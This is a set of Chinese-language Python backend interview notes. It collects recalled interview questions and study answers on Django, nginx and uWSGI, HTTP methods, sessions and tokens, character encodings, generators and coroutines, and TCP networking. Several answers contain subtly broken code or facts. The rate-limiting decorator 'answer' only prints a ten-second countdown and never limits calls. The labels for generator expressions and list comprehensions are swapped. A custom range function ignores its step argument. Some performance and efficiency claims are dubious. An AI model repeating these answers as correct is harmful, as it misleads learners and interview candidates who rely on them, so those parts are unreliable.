	celery讲一下			  答：异步框架
	多进程和多线程的区别		 答：巴拉巴拉
	进程之间怎么通信			答：队列或管道
	索引有哪些			答：只回答了主键索引，唯一索引
	索引是怎么加快查询速度的		答：支支吾吾，它是一种新的数据结构
	索引底层是什么数据结构		答：不知道
	你在orm里写原生sql，怎么判断他走了索引或者是全局查了一次    答：不知道
	你们之前的项目上线了是怎么看他死了没	答：不清楚，这是运维做的。


	讲一个项目			答：cmdb
	怎么起一个容器			答：docker start 容器
	怎么新建一个容器			答：。。。。
	全局异常捕获			答：。。。。。
	装饰器				答：。。。。
	http状态码			答：2 3 4 5
	秒杀用什么锁			答：悲观锁，其实应该用乐观锁


	讲项目				答：cmdb
	写题目给你写
	装饰器怎么写
	with管理上下文的源码怎么写，类似的就行
	让你开发微信二维码电脑端登录，你要怎么实现
	property是什么
	__setattr__
	
	一个字符串，让你倒序输出，例子 my name is  >>>  is name my
	判断括号是否合法，类似于leetcode上的，[](){}，每个括号都要成对


​	

```
列表和元组的区别
*args,**kwargs
pep8
对于类和对象，在操作系统的表现有什么区别
开发的环境部署在什么环境，linx,基本命令了解
开发使用pycharm,cpython,python构建，docker,数据库
购买了阿里云服务器，有root账号




1、有a,b,c,d四个人，其中一个是小偷；a说我不是小偷，b说一定是c，c说小偷是d，d说c在胡说八道；
	其中三个人说的真话，一个人说的假话，请用编程得出谁是小偷
	
	
2、有n阶台阶，一次可以跳1级，也可以跳2级，。。。也可以跳n级；那么跳上第n阶有几种方式，请用编程求出结果



3、有一个列表，请使用编程实现对它的反转，直接修改原列表，不用内置方法


4、有模块B，其中有一个prinit("B");
	模块A、C都导入了B；
	启动文件main.py中，导入了A和C；
	问prinit("B")被执行了几次
	

5、数据库中有一个自增的用户表，用户名有重复的，请用sql命令删除重复的记录，并随机保留一条


6、有一个单链表，请用编程实现单链表的反转

7、如何实现数据库的热备份，并且由原来的表变成四个表

8、sqlalchemy的使用，关于阻塞的，我不记得具体问题了

9、用Python实现单链表，并实现它的逆序

10、用python中序遍历一个二叉树
```

## http发送10万条数据，然后设计

​            就是正常用web框架写
​            要性能高就用uwsgi部署，加上异步处理
​            一次10万，用django肯定会顶不住
​            所以可以做集群，用异步
​            单个uwsgi加django能达到1万
​            代码是一层面
​            架构也是一层面
​            语言也是一层面
​            加集群
​            一台抗一万，10台不就10万
​            web框架方面优化，换异步框架
​            代码方面优化，用异步
​            celery

## 装饰器，生成器，迭代器的使用

装饰器:装饰器本质上还是一个函数,比如你想要执行某个函数前记录日志，又不想改动这个函数，就可以通过装饰器来实现,装饰器也是可以带参数的，请实现一个装饰器,限制该函数被调用的频率,如10秒一次

```
# 答案
import time
def time_pay(func):

    def inner(*args, **kwargs):
        for line in range(10):
            print(line + 1)
            time.sleep(1)

        res = func(*args, **kwargs)

        return res

    return inner

@time_pay
def func1():
    print('from func1...')
    
func1()
```



迭代器:可迭代对象，简单的来理解就是可以使用 for 来循环遍历的对象。比如常见的 list、set和dict。 

生成器:多用于列表生成式， yield 函数记录此时的函数调用位置，下一次从这个位置开始。

## 谈谈你对闭包的理解？

闭包(closure)是函数式编程的重要的语法结构。闭包也是一种组织代码的结构，它同样提高了代码的可重复使用性。
当一个内嵌函数引用其外部作作用域的变量,我们就会得到一个闭包. 总结一下,创建一个闭包必须满足以下几点:

* 必须有一个内嵌函数

* 内嵌函数必须引用外部函数中的变量

* 外部函数的返回值必须是内嵌函数

* ```
  定义：在一个函数内部的函数，被外层函数包裹着，可访问到外层函数中的变量名，如下inner函数就是一个闭包函数。
  def outer():
      num = 1
      def inner():
          print(num)  # 内层函数中不存在num 但可以访问到外层的num
      return inner
  func = outer()  # func == inner
  num = 1000
  func()  # 输出结果：1
  ```

* 

## 什么是lambda函数？ 有什么好处？

lambda 函数是一个可以接收任意多个参数(包括可选参数)并且返回单个表达式值的函数
1、lambda 函数比较轻便，即用即仍，很适合需要完成一项功能，但是此功能只在此一处使用，
连名字都很随意的情况下；
2、匿名函数，一般用来给 filter， map 这样的函数式编程服务;
3、作为回调函数，传递给某些应用，比如消息处理

## **基于rbac的权限管理**

RBAC（Role-Based Access Control，基于角色的访问控制），就是用户通过角色与权限进行关联。简单地说，一个用户拥有若干角色，一个角色拥有若干权限。这样，就构造成“用户-角色-权限”的授权模型。在这种模型中，用户与角色之间，角色与权限之间都是多对多的关系。

get-post定义的规范

## 8. 谈一下你对uWSGI和 nginx的理解？

1.uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。WSGI是一种Web服务器网关接口。它是一个Web服务器（如nginx，uWSGI等服务器）与web应用（如用Flask框架写的程序）通信的一种规范。
要注意 WSGI / uwsgi / uWSGI 这三个概念的区分。
WSGI是一种通信协议。
uwsgi是一种线路协议而不是通信协议，在此常用于在uWSGI服务器与其他网络服务器的数据通信。
uWSGI是实现了uwsgi和WSGI两种协议的Web服务器。
**2. nginx是一个开源的高性能的HTTP服务器和反向代理：**
1.作为web服务器，它处理静态文件和索引文件效果非常高；
2.它的设计非常注重效率，最大支持5万个并发连接，但只占用很少的内存空间； 
3.稳定性高，配置简洁；
4.强大的反向代理和负载均衡功能，平衡集群中各个服务器的负载压力应用。

## 9. 说说nginx和uWISG 服务器之间如何配合工作的？

首先浏览器发起http请求到nginx服务器，Nginx根据接收到请求包，进行url分析，判断访问的资源类型，如果是静态资源，直接读取静态资源返回给浏览器，如果请求的是动态资源就转交给uwsgi服务器，uwsgi服务器根据自身的uwsgi和WSGI协议，找到对应的Django框架，Django框架下的应用进行逻辑处理后，将返回值发送到uwsgi服务器，然后uwsgi服务器再返回给nginx，最后nginx将返回值返回给浏览器进行渲染显示给用户。 如果可以，画图讲解效果更佳，可以 将下面的图画给面试官。
![img](https://img-blog.csdnimg.cn/20181108115344784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RvbWluaWNKaQ==,size_16,color_FFFFFF,t_70)

## 72.简述浏览器通过WSGI请求动态资源的过程?

```
'''
1.发送http请求动态资源给web服务器
2.web服务器收到请求后通过WSGI调用一个属性给应用程序框架
3.应用程序框架通过引用WSGI调用web服务器的方法，设置返回的状态和头信息。
4.调用后返回，此时web服务器保存了刚刚设置的信息
5.应用程序框架查询数据库，生成动态页面的body的信息
6.把生成的body信息返回给web服务器
7.web服务器吧数据返回给浏览器
'''
```

## 73.描述用浏览器访问www.baidu.com的过程

### 什么是域名解析?

```
# 答案:
'''
在互联网上，所有的地址都是ip地址，现阶段主要是IPv4（比如：110.110.110.110）。
但是这些ip地址太难记了，所以就出现了域名（比如http://baidu.com）。
域名解析就是将域名，转换为ip地址的这样一种行为。
'''
```

### 

```
1、域名解析：
浏览器向DNS获取web服务器 www.baidu.com这个域名的 的ip地址
2、建立TCP连接
浏览器与对应ip地址的服务器进行TCP链接，端口为80
3、浏览器执行HTTP协议，发送GET请求，读取对应文件
4、服务器接收到请求后,返回网页信息 
5.客户端浏览器将这些信息组织成用户可以查看的网页形式
```

域名解析的过程

```
- 要先使用arp获取默认网关的mac地址
- 组织数据发送给默认网关(ip还是dns服务器的ip，但是mac地址是默认网关的mac地址)
- 默认网关拥有转发数据的能力，把数据转发给路由器
- 路由器根据自己的路由协议，来选择一个合适的较快的路径转发数据给目的网关
- 目的网关(dns服务器所在的网关)，把数据转发给dns服务器
- dns服务器查询解析出baidu.com对应的ip地址，并原路返回请求这个域名的client
得到了baidu.com对应的ip地址
```



```
'''
先要解析出baidu.com对应的ip地址
- 要先使用arp获取默认网关的mac地址
- 组织数据发送给默认网关(ip还是dns服务器的ip，但是mac地址是默认网关的mac地址)
- 默认网关拥有转发数据的能力，把数据转发给路由器
- 路由器根据自己的路由协议，来选择一个合适的较快的路径转发数据给目的网关
- 目的网关(dns服务器所在的网关)，把数据转发给dns服务器
- dns服务器查询解析出baidu.com对应的ip地址，并原路返回请求这个域名的client
得到了baidu.com对应的ip地址之后，会发送tcp的3次握手，进行连接
使用http协议发送请求数据给web服务器
- web服务器收到数据请求之后，通过查询自己的服务器得到相应的结果，原路返回给浏览器。
- 浏览器接收到数据之后通过浏览器自己的渲染功能来显示这个网页。
- 浏览器关闭tcp连接，即4次挥手结束，完成整个访问过程
'''
```



## 10. django开发中数据库做过什么优化?

1.设计表时，尽量少使用外键，因为外键约束会影响插入和删除性能；
2.使用缓存，减少对数据库的访问；
3.在orm框架下设置表时，能用varchar确定字段长度时，就别用text；
4.可以给搜索频率高的字段属性，在定义时创建索引；
5.Django orm框架下的Querysets 本来就有缓存的；
6.如果一个页面需要多次连接数据库，最好一次性取出所有需要的数据，减少对数据库的查询次数；
7.若页面只需要数据库里某一个两个字段时，可以用QuerySet.values()；
8.在模板标签里使用with标签可以缓存Qset的查询结果。

## django如何提升性能（高并发）？

对一个后端开发程序员来说，提升性能指标主要有两个一个是并发数，另一个是响应时间网站性能的优化一般包括web前端性能优化，应用服务器性能优化，存储服务器优化。
对前端的优化主要有：
1.减少http请求，减少数据库的访问量，比如使用雪碧图。
2.使用浏览器缓存，将一些常用的css，js，logo图标，这些静态资源缓存到本地浏览器，通过设置http头中的cache-control和expires的属性，可设定浏览器缓存，缓存时间可以自定义。
3.对html，css，javascript文件进行压缩，减少网络的通信量。
对我个人而言，我做的优化主要是以下三个方面：
1.合理的使用缓存技术，对一些常用到的动态数据，比如首页做一个缓存，或者某些常用的数据做
个缓存，设置一定得过期时间，这样减少了对数据库的压力，提升网站性能。
2.使用celery消息队列，将耗时的操作扔到队列里，让worker去监听队列里的任务，实现异步操
作，比如发邮件，发短信。
3.就是代码上的一些优化，补充：nginx部署项目也是项目优化，可以配置合适的配置参数，提升效率，增加并发量。
4.如果太多考虑安全因素，服务器磁盘用固态硬盘读写，远远大于机械硬盘，这个技术现在没有普及，主要是固态硬盘技术上还不是完全成熟， 相信以后会大量普及。
5.另外还可以搭建服务器集群，将并发访问请求，分散到多台服务器上处理。
6.最后就是运维工作人员的一些性能优化技术了。

## 14. 什么是restful api，谈谈你的理解?

上来先给面试官扔出一手Django的restgramework源码(这一块知识课下一定要自己看着源码走三遍做到烂熟于心，看着面试官的眼睛快速自信的说出。这一手源码扔出来之后，面试已经成功一半)
REST:Representational State Transfer的缩写，翻译：“具象状态传输”。一般解释为“表现层状态转换”。
REST是设计风格而不是标准。是指客户端和服务器的交互形式。我们需要关注的重点是如何设计REST风格的网络接口。
REST的特点：
1.具象的。一般指表现层，要表现的对象就是资源。比如，客户端访问服务器，获取的数据就是资源。比如文字、图片、音视频等。
2.表现：资源的表现形式。txt格式、html格式、json格式、jpg格式等。浏览器通过URL确定资源的位置，但是需要在HTTP请求头中，用AcceptContent-Type字段指定，这两个字段是对资源表现的描述。
3.状态转换：客户端和服务器交互的过程。在这个过程中，一定会有数据和状态的转化，这种转化叫做状态转换。其中，GET表示获取资源，POST表示新建资源，PUT表示更新资源，DELETE表示删除资源。HTTP协议中最常用的就是这四种操作方式。
RESTful架构：
1.每个URL代表一种资源；
2.客户端和服务器之间，传递这种资源的某种表现层；
3.客户端通过四个http动词，对服务器资源进行操作，实现表现层状态转换。

## HTTP请求方法都有什么？

```
'''
根据HTTP标准，HTTP请求可以使用多种请求方法。
HTTP1.0定义了三种请求方法： GET， POST 和 HEAD方法。
HTTP1.1新增了五种请求方法：OPTIONS， PUT， DELETE， TRACE 和 CONNECT 方法。
1、 GET 请求指定的页面信息，并返回实体主体。
2、HEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头
3、POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在
请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。
4、PUT 从客户端向服务器传送的数据取代指定的文档的内容。
5、DELETE 请求服务器删除指定的页面。
6、CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。
7、OPTIONS 允许客户端查看服务器的性能。
8、TRACE 回显服务器收到的请求，主要用于测试或诊断。
'''
```

## HTTP常见请求头？

```
'''
1. Host (主机和端口号)
2. Connection (链接类型)
3. Upgrade-Insecure-Requests (升级为 HTTPS 请求)
4. User-Agent (浏览器名称)
5. Accept (传输文件类型)
6. Referer (页面跳转处)
7. Accept-Encoding（文件编解码格式）
8. Cookie （Cookie）
9. x-requested-with :XMLHttpRequest  (是 Ajax 异步请求)
'''
```

## 74.Post和Get请求的区别?

GET请求：

```
'''
请求的数据会附加在URL之后，以?分割URL和传输数据，多个参数用&连接。URL的
编码格式采用的是ASCII编码，而不是uniclde，即是说所有的非ASCII字符都要编码之后再传输。
'''
```

POST请求：

```
'''
POST请求会把请求的数据放置在HTTP请求包的包体中。上面的item=bandsaw就
是实际的传输数据。
因此，GET请求的数据会暴露在地址栏中，而POST请求则不会。
传输数据的大小：
- 在HTTP规范中，没有对URL的长度和传输的数据大小进行限制。但是在实际开发过程中，对
于GET，特定的浏览器和服务器对URL的长度有限制。因此，在使用GET请求时，传输数据会
受到URL长度的限制。
- 对于POST，由于不是URL传值，理论上是不会受限制的，但是实际上各个服务器会规定对POST
提交数据大小进行限制，Apache、IIS都有各自的配置。
安全性：
- POST的安全性比GET的高。这里的安全是指真正的安全，而不同于上面GET提到的安全方法
中的安全，上面提到的安全仅仅是不修改服务器的数据。比如，在进行登录操作，通过GET请求，
用户名和密码都会暴露再URL上，因为登录页面有可能被浏览器缓存以及其他人查看浏览器的.
历史记录的原因，此时的用户名和密码就很容易被他人拿到了。除此之外，GET请求提交的数据.
还可能会造成Cross-site request frogery攻击。
'''
```

效率：GET比POST效率高。

```python
'''
POST请求的过程：
  1.浏览器请求tcp连接（第一次握手）
  2.服务器答应进行tcp连接（第二次握手）
  3.浏览器确认，并发送post请求头（第三次握手，这个报文比较小，所以http会在此时进行
第一次数据发送）
  4.服务器返回100 continue响应
  5.浏览器开始发送数据
  6.服务器返回200 ok响应
GET请求的过程：
    1.浏览器请求tcp连接（第一次握手）
    2.服务器答应进行tcp连接（第二次握手）
    3.浏览器确认，并发送get请求头和数据（第三次握手，这个报文比较小，所以http会在此时
进行第一次数据发送）
    4.服务器返回200 OK响应
'''
```

## 什么是cookie,token和session?它们之间有什么关系？

**token**令牌，是用户身份的验证方式。最简单的token组成:uid(用户唯一的身份标识)、time（当前时间的时间戳）、sign（签名）。对Token认证的五点认识**一个Token就是一些信息的集合；**在Token中包含足够多的信息，以便在后续请求中减少查询数据库的几率；服务端需要对cookie和HTTP Authrorization Header进行Token信息的检查；基于上一点，你可以用一套token认证代码来面对浏览器类客户端和非浏览器类客户端；因为token是被签名的，所以我们可以认为一个可以解码认证通过的token是由我们系统发放的，其中带的信息是合法有效的；**session**会话，代表服务器与浏览器的一次会话过程，这个过程是连续的，也可以时断时续。cookie中存放着一个sessionID，请求时会发送这个ID；session因为请求（request对象）而产生；session是一个容器，可以存放会话过程中的任何对象；session的创建与使用总是在服务端，浏览器从来都没有得到过session对象；session是一种http存储机制，目的是为武装的http提供持久机制。

**cookie**储存在用户本地终端上的数据，服务器生成，发送给浏览器，下次请求统一网站给服务器。

**cookie与session区别**cookie数据存放在客户端上，session数据放在服务器上；cookie不是很安全，且保存数据有限；session一定时间内保存在服务器上,当访问增多，占用服务器性能。

**session与token**作为身份认证，token安全行比session好；Session 认证只是简单的把User 信息存储到Session 里，因为SID 的不可预测性，暂且认为是安全的。这是一种认证手段。 而Token ，如果指的是OAuth Token 或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对App 。其目的是让 某App有权利访问 某用户 的信息。

**token与cookie**Cookie是不允许垮域访问的，但是token是支持的， 前提是传输的用户认证信息通过HTTP头传输；
token就是令牌，比如你授权（登录）一个程序时，他就是个依据，判断你是否已经授权该软件；cookie就是写在客户端的一个txt文件，里面包括你登录信息之类的，这样你下次在登录某个网站，就会自动调用cookie自动登录用户名；session和cookie差不多，只是session是写在服务器端的文件，也需要在客户端写入cookie文件，但是文件里是你的浏览器编号.Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。

## python解释器的种类和特点

```
## CPython

CPython是使用最广且被的Python解释器。本教程以CPython为准。当我们从Python官方网站下载并安装好Python 2.7后，我们就直接获得了一个官方版本的解释器：CPython。这个解释器是用C语言开发的，所以叫CPython。在命令行下运行python就是启动CPython解释器。

## IPython

IPython是基于CPython之上的一个交互式解释器，也就是说，IPython只是在交互方式上有所增强，但是执行Python代码的功能和CPython是完全一样的。好比很多国产浏览器虽然外观不同，但内核其实都是调用了IE。CPython用>>>作为提示符，而IPython用In [序号]:作为提示符。

## PyPy

PyPy是另一个Python解释器，它的目标是执行速度。PyPy采用JIT技术，对Python代码进行动态编译（注意不是解释），所以可以显著提高Python代码的执行速度。

绝大部分Python代码都可以在PyPy下运行，但是PyPy和CPython有一些是不同的，这就导致相同的Python代码在两种解释器下执行可能会有不同的结果。如果你的代码要放到PyPy下执行，就需要了解PyPy和CPython的不同点。

## Jython

Jython是运行在Java平台上的Python解释器，可以直接把Python代码编译成Java字节码执行。

## IronPython

IronPython和Jython类似，只不过IronPython是运行在微软.Net平台上的Python解释器，可以直接把Python代码编译成.Net的字节码。

```

## ascii,unicode,utf8,gbk的区别

```
'''
ascii：
在计算机内部，所有信息最终都是一个二进制值。每一个二进制位（bit），有0和1两种状态，因此，8个二进制位可以组合出256种状态，这被称为字节（byte)。上个世纪60年代，美国制定了一套字符编码，对英文字符与二进制之间做了联系，这被称为ASCII码，一直沿用至今。
ASCII码一共规定了128个字符，比如SPACE是32，A是65，这128个符号只咱用了一个字节的后面七位，最前面的一位统一规定为0。


unicode：
世界上有多种编码方法，同一个二进制数字可以被解释称不同的符号。因此，在打开一个文本文件时候，就必须知道它的编码方式，用错误的编码方式打开，就会出现乱码。
Unicode编码，这是一种所有符号的编码。
Unicode显然是一个巨大的集合，现在的规模可以容纳100多万个符号。每个符号的编码都不一样，比如U+0041表示英语的大写字母A，U+4e25表示汉字严。
在Unicode庞大的字符集的优势下，还存在一个问题，比如一个汉字，“严”的Unicode是十六进制4e25，转成二进制足足有15位，也就是，这个符号需要2个字节，表示其他字符还存在3个字节或者更多。计算机怎么区别三个字节表示的是同一个符号而不是分开表示三个呢？如果Unicode统一规定，每个符号用3个字节表示，但是某些字母显然不需要3个，那么就浪费了空间，文本文件大小超出了很多，这显然是不合理的。直到UTF8字符编码出现了。


utf-8：
UTF8的最大特点是，它是一种变长编码，可以使用1-4个字节表示一个符号，根据不同的符号来变化字节长度。
UTF8编码规则只有两条：
1）对于单字节的符号，字节的第一位设为0，后面的7位为这个符号的Unicode码。因此，对于英文字母，UTF8编码和ASCII编码是相同的。
2）对于非单字节（假设字节长度为N）的符号，第一个字节的前N位都设为1，第N+1设为0，后面字节的前两位一律设为10，剩下的没有提及的二进制，全部为这个符号的Unicode码。


gbk：
GBK编码是对GB2312的扩展，完全兼容GB2312。采用双字节编码方案，剔出xx7F码位，共23940个码位，共收录汉字和图形符号21886个，GBK编码方案于1995年12月15日发布。它几乎完美支持汉字，因此经常会遇见GBK与Unicode的转换。

1，各个编码之间的二进制，是不能互相识别的，会产生乱码。
2，文件的存储，传输，不能是unicode （只能是utf-8 utf-16 gbk gbk2312 ascii等）
'''
```

## 20、现有字典 dict={‘a’:24，‘g’:52，‘i’:12，‘k’:33}请按字典中的 value 值进行排序？

```
'''
sorted(dict.items()，key = lambda x:x[1])
'''
```

## 什么是反射?以及应用场景?

```
在绝大多数语言当中都有反射机制的存在， 可以用字符串的方式去访问对象的属性，调用对象的方法（但是不能去访问方法），Python中一切皆对象，都可以使用反射。
1）、反射机制是很多框架的基石。
```

## 简述Python的深浅拷贝?

```
copy()：浅copy，浅拷贝指仅仅拷贝数据集合的第一层数据

deepcopy():深copy,深拷贝指拷贝数据集合的所有层
```

## Python 垃圾回收机制?

```
垃圾回收机制是自动帮助我们管理内存，清理垃圾的一种工具

1）、引用计数
当一个对象的引用被创建或者复制时，对象的引用计数加1；
当一个对象的引用被销毁时，对象的引用计数减1；
当对象的引用计数减少为0时，就意味着对象已经没有被任何人使用了，可以将其所占用的内存释放了。

优点：

简单、直观
实时性，只要没有了引用就释放资源。
缺点：

维护引用计数需要消耗一定的资源
循环应用时，无法回收。也正是因为这个原因，才需要通过标记-清理和分代收集机制来辅助引用计数机制。

2）、标记-清除
“标记-清除”不改动真实的引用计数，而是将
集合中对象的引用计数复制一份副本，改动该对象引用的副本。对于副
本做任何的改动，都不会影响到对象生命走起的维护。

3）、分代回收
将系统中的所有内存块根据其存活时间划分为不同的集合，
每一个集合就成为一个“代”，垃圾收集的频率随着“代”的存活时间的增大而减小。
也就是说，活得越长的对象，就越不可能是垃圾，就应该减少对它的垃圾收集频率。
那么如何来衡量这个存活时间：通常是利用几次垃圾收集动作来衡量，
如果一个对象经过的垃圾收集次数越多，可以得出：该对象存活时间就越长。
```

## 二 、 协同程序

协程：是单线程下的并发，又称微线程，纤程。英文名Coroutine。一句话说明什么是线程：协程是一种用户态的轻量级线程，即协程是由用户程序自己控制调度的。



协同程序（协程）一般来说是指这样的函数：

* 彼此间有不同的局部变量、指令指针，但仍共享全局变量；
* 可以方便地挂起、恢复，并且有多个入口点和出口点；
* 多个协同程序间表现为协作运行，如A的运行过程中需要B的结果才能继续执行。

协程的特点决定了同一时刻只能有一个协同程序正在运行（忽略多线程的情况）。得益于此，协程间可以直接传递对象而不需要考虑资源锁、或是直接唤醒其他协程而不需要主动休眠，就像是内置了锁的线程。在符合协程特点的应用场景，使用协程无疑比使用线程要更方便。

从另一方面说，协程无法并发其实也将它的应用场景限制在了一个很狭窄的范围，这个特点使得协程更多的被拿来与常规函数进行比较，而不是与线程。当然，线程比协程复杂许多，功能也更强大，所以我建议大家牢牢地掌握线程即可，是不是听了一脸懵逼，那么就别管他了，因为并发编程你会重新学习他。因此这一节里我也就不列举关于协程的例子了，以下介绍的方法了解即可。

由于Python2.5+对生成器的增强实现了协程的其他特点，在这个版本中，生成器加入了如下方法：

**2.1 send(value):**

send是除next外另一个恢复生成器的方法。Python2.5+中，yield语句变成了yield表达式，这意味着yield现在可以有一个值，而这个值就是在生成器的send方法被调用从而恢复执行时，调用send方法的参数。

```python
def h():
    print('--start--')
    first = yield 5  # 等待接收 Fighting! 值
    print('1', first)
    second = yield 12  # 等待接收 hahaha! 值
    print('2', second)
    yield 13
    print('--end--')


g = h()
first = next(g)  # m 获取了yield 5 的参数值 5
# (yield 5)表达式被赋予了'Fighting!',  d 获取了yield 12 的参数值12
second = g.send('Fighting!')
third = g.send('hahaha!')  # (yield 12)表达式被赋予了'hahaha!'
print(f'--over--')
print(f"first:{first}, second:{second}, third:{third}")
--start--
1 Fighting!
2 hahaha!
--over--
first:5, second:12, third:13
```

* 调用send传入非None值前，生成器必须处于挂起状态，否则将抛出异常。不过，未启动的生成器仍可以使用None作为参数调用send。
* 如果使用next恢复生成器，yield表达式的值将是None。

**2.2 close()**

这个方法用于关闭生成器。对关闭的生成器后再次调用next或send将抛出StopIteration异常。

```python
def repeater():
    n = 0
    while True:
        n = (yield n)


r = repeater()
r.close()
print(next(r))  # StopIteration
```

**2.3 throw(type, value=None, traceback=None)**

中断Generator是一个非常灵活的技巧，可以通过throw抛出一个GeneratorExit异常来终止Generator。Close()方法作用是一样的，其实内部它是调用了throw(GeneratorExit)的。我们看close的源代码

```python
def close(self):
    try:
        self.throw(GeneratorExit)
    except (GeneratorExit, StopIteration):
        pass 
    else:
        raise RuntimeError("generator ignored GeneratorExit") # Other exceptions are not caught
```

**三、自定义range()方法**

```python
def my_range(start, stop, step=1):
    while start < stop:
        yield start
        start += 1


g = my_range(0, 3)
print(f"list(g): {list(g)}")
list(g): [0, 1, 2]
```

**四、总结**

1. 提供一种自定义迭代器的方式
2. yield可以暂停住函数，并提供当前的返回值

yield和return:

1. 相同点：两者都是在函数内部使用，都可以返回值，并且返回值没有类型和个数的限制
2. 不同点：return只能返回一次之；yield可以返回多次值

**五、生成器表达式**

* 把列表推导式的[]换成()就是生成器表达式
* 优点：省内存，一次只产生一个值在内存中

```python
t = (i for i in range(10))
print(t)
print(f"next(t): {next(t)}")
<generator object <genexpr> at 0x1101c4888>
next(t): 0
```

**5.1 生成器表达式和列表推导式**

```python
# 生成器表达式
with open('52.txt', 'r', encoding='utf8') as f:
    nums = [len(line) for line in f]

print(max(nums))
#输出：
1
# 列表推导式
with open('52.txt','r',encoding='utf8') as f:
    nums = (len(line) for line in f)

print(max(nums)) # ValueError: I/O operation on closed file.
```

## 网络编程

python多线程与多进程的区别：

在UNIX平台上，当某个进程终结之后，该进程需要被其父进程调用wait，否则进程成为僵尸进程(Zombie)。所以，有必要对每个Process对象调用join()方法 (实际上等同于wait)。对于多线程来说，由于只有一个进程，所以不存在此必要性。

多进程应该避免共享资源。在多线程中，我们可以比较容易地共享资源，比如使用全局变量或者传递参数。在多进程情况下，由于每个进程有自己独立的内存空间，以上方法并不合适。此时我们可以通过共享内存和Manager的方法来共享资源。但这样做提高了程序的复杂度，并因为同步的需要而降低了程序的效率。

### python的底层网络交互模块有哪些?

```
# 答案:
'''
socket, urllib,urllib3 , requests, grab, pycurl
'''
```



### 什么是C/S和B/S架构?

```
# 答案:
'''
软件系统体系结构:
C/S体系结构:
指的是客户端/服务端    例如;QQ

B(browser)/S体系结构:
指的是浏览器/服务端      例如12306(网站);购物网站


两者区别:
C/S :优点:交互性好,对服务器压力小,安全 ;缺点:服务器更新时需要同步更新客户端
B/S:优点:不需要更新客户端   缺点:交互性差,安全性低
'''
```

### 4、简述TCP三次握手、四次挥手的流程。

三次握手过程：

```
1首先客户端向服务端发送一个带有SYN 标志，以及随机生成的序号100(0字节)的报文
2服务端收到报文后返回一个报文(SYN200(0字节)，ACk1001(字节+1))给客户端
3客户端再次发送带有ACk标志201(字节+)序号的报文给服务端
至此三次握手过程结束，客户端开始向服务端发送数据。
1客户端向服务端发起请求：我想给你通信，你准备好了么？
2服务端收到请求后回应客户端：I'ok，你准备好了么
3客户端礼貌的再次回一下客户端：准备就绪，咱们开始通信吧！
整个过程跟打电话的过程一模一样:1喂，你在吗2在，我说的你听得到不3恩，听得到(接下来请
开始你的表演)
补充：SYN：请求询问，ACk：回复，回应。
```

四次挥手过程：

```
由于TCP连接是可以双向通信的（全双工），因此每个方向都必须单独进行关闭（这句话才是
精辟，后面四个挥手过程都是其具体实现的语言描述）
四次挥手过程，客户端和服务端都可以先开始断开连接
1客户端发送带有fin标识的报文给服务端，请求通信关闭
2服务端收到信息后，回复ACK答应关闭客户端通信(连接)请求
3服务端发送带有fin标识的报文给客户端，也请求关闭通信
4客户端回应ack给服务端，答应关闭服务端的通信(连接)请求
```

### 5、什么是arp协议?

```
# 答案:
'''
ARP协议，全称“Address Resolution Protocol”,中文名是地址解析协议，使用ARP协议可实现通过IP地址获得对应主机的物理地址（MAC地址）。
'''
```





### 6、TCP和UDP的区别?为何基于tcp协议的通信比基于udp协议的通信更可靠?

```
# 答案:
# TCP和UDP的区别?
'''
1、TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接
2、TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付
3、TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的
UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）
4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信
5、TCP首部开销20字节;UDP的首部开销小，只有8个字节
6、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道
'''

# 为何基于tcp协议的通信比基于udp协议的通信更可靠？
'''
tcp:可靠 对方给了确认收到信息，才发下一个，如果没收到确认信息就重发
udp:不可靠 一直发数据，不需要对方回应
'''
```

### 7、什么是局域网和广域网?

```
# 答案:
'''
两者范围不一样:
        局域网就是在固定的一个地理区域内由2台以上的电脑用网线和其他网络设备搭建而成的一个封闭的计算机组，范围在几千米以内；
        广域网是一种地域跨度非常大的网络集合，范围在几十公里到几千公里。

两者的IP地址设置不一样:-*+
        局域网里面，必须在网络上有一个唯一的IP地址，这个IP地址是唯一的，在另外一个局域网，这个IP地址仍然能够使用。
        广域网上的每一台电脑（或其他网络设备）都有一个或多个广域网IP地址，而且不能重复。
'''
```

### 8.什么是socket?简述基于tcp协议的套接字通信流程。

```
# 答案:
'''
        Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。在设计模式中，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部。

服务端:
        创建socket对象，绑定ip端口bind(),  设置最大链接数listen(),  accept()与客户端的connect()创建双向管道， send(), recv(),close()

客户端:
        创建socket对象，connect()与服务端accept()创建双向管道, send(),recv(),close()
'''
```

### 9.什么是粘包? socket中造成粘包的原因是什么? 哪些情况会发生粘包现象?

```
# 答案:
'''
粘包:
        数据粘在一起，主要因为：接收方不知道消息之间的界限，不知道一次性提取多少字节的数据造成的数据量比较小，时间间隔比较短，就合并成了一个包，这是底层的一个优化算法（Nagle算法）
'''
```

### 10.IO多路复用的作用?

```
# 答案:
'''
        I/O多路复用是用于提升效率，单个进程可以同时监听多个网络连接IO。

举例:
        通过一种机制，可以监视多个文件描述符，一旦描述符就绪（读就绪和写就绪），能通知程序进行相应的读写操作，I/O多路复用避免阻塞在io上，原本为多进程或多线程来接收多个连接的消息变为单进程或单线程保存多个socket的状态后轮询处理。
'''
```

### 11.什么是防火墙以及作用?

```
# 答案:
'''
